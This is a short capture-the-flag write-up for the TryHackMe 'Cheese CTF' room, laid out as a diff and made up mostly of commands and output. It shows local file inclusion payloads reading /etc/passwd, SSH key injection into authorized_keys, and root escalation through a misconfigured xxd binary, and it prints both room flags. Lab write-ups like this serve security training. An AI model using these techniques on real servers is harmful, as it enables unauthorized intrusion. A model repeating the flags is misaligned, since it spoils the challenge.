@@ -1,0 +1,112 @@
+-------------Cheese CTF TRYHACKME-------------
+Link: https://tryhackme.com/r/room/cheesectfv10
+Date: 23/10/2024
+
+
+
+http://10.10.104.116/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
+
+http://10.10.104.116/secret-script.php?file=../../../../etc/passwd
+
+http://10.10.104.116/secret-script.php?file=php://filter/resource=.././../../etc/passwd
+
+curl "http://10.10.70.182/secret-script.php?file=$(cat payload.txt)"
+
+ssh-keygen -t rsa
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDzUu8a1FiOygsrj+FuFBxhHxz4Y8pNga70KdXox0YttO1/CPvawHvS/NST+X/wMDYa6A0MO8bxW7u6/rYrBS4vbgqgFr8xI28RltmsOcFbD6bpQ4OIXzh0CWeyy2S2BA0jGemQAuQemooFeIQtJFdnii/l1/OeYjYiBOjrwF+hU9XXmkM/XfmQ9w7zNsanKBD0hXoOYG2bnL5D8WW17wKLCm8doFJhG1GXQUp7AdAeOOMg7YsVlI/hUE+tTFh77FSTrdR25b43JtEhEgyvPRR1WpHg6ssgcOoLpkN5Mq8LVZf6yoVtypBj3HuxaXVUsng3zufn4pB+658GLXuwSeimh9Ek7nMAuEpJlWPFC8Xe4aOSLyoo9XYzuf8ZWnz7ir32YOsaJ4aQPkuMy8XZqAVCK6Yh0tcwjZJz/BghhPE0ems9mNmHVIzcEitabRZar8Ko2/5Nrj1ty89L8JqAQV3sRBkIyAW7d8QeQERe+IsGxKF4Q4u+pHM6bmhJt7XT60= root@kali" > /home/comte/.ssh/authorized_keys
+
+ssh -i id_rsa comte@10.10.70.182
+
+comte@cheesectf:~$ cat user.txt 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
+⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
+⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
+⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
+⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
+⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
+⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
+⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
+⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
+⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
+comte@cheesectf:~$ sudo -l
+User comte may run the following commands on cheesectf:
+    (ALL) NOPASSWD: /bin/systemctl daemon-reload
+    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+comte@cheesectf:~$ 
+
+cho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDzUu8a1FiOygsrj+FuFBxhHxz4Y8pNga70KdXox0YttO1/CPvawHvS/NST+X/wMDYa6A0MO8bxW7u6/rYrBS4vbgqgFr8xI28RltmsOcFbD6bpQ4OIXzh0CWeyy2S2BA0jGemQAuQemooFeIQtJFdnii/l1/OeYjYiBOjrwF+hU9XXmkM/XfmQ9w7zNsanKBD0hXoOYG2bnL5D8WW17wKLCm8doFJhG1GXQUp7AdAeOOMg7YsVlI/hUE+tTFh77FSTrdR25b43JtEhEgyvPRR1WpHg6ssgcOoLpkN5Mq8LVZf6yoVtypBj3HuxaXVUsng3zufn4pB+658GLXuwSeimh9Ek7nMAuEpJlWPFC8Xe4aOSLyoo9XYzuf8ZWnz7ir32YOsaJ4aQPkuMy8XZqAVCK6Yh0tcwjZJz/BghhPE0ems9mNmHVIzcEitabRZar8Ko2/5Nrj1ty89L8JqAQV3sRBkIyAW7d8QeQERe+IsGxKF4Q4u+pHM6bmhJt7XT60= root@kali" | xxd | /opt/xxd -r - "/root/.ssh/authorized_keys"
+
+ssh -i id_rsa root@10.10.70.182
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-174-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 23 Oct 2024 11:59:58 AM UTC
+
+  System load:  0.0                Processes:             137
+  Usage of /:   31.1% of 18.53GB   Users logged in:       0
+  Memory usage: 8%                 IPv4 address for ens5: 10.10.70.182
+  Swap usage:   0%
+
+
+ * Introducing Expanded Security Maintenance for Applications.
+   Receive updates to over 25,000 software packages with your
+   Ubuntu Pro subscription. Free for personal use.
+
+     https://ubuntu.com/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+47 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Apr  4 17:21:43 2024
+root@cheesectf:~# cat root.txt 
+      _                           _       _ _  __
+  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
+ / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
+| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
+ \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|
+
+
+THM{dca75486094810807faf4b7b0a929b11e5e0167c}
+root@cheesectf:~# 
+
+
+
+Thank you for reading my opinion of the room @petstar from togo
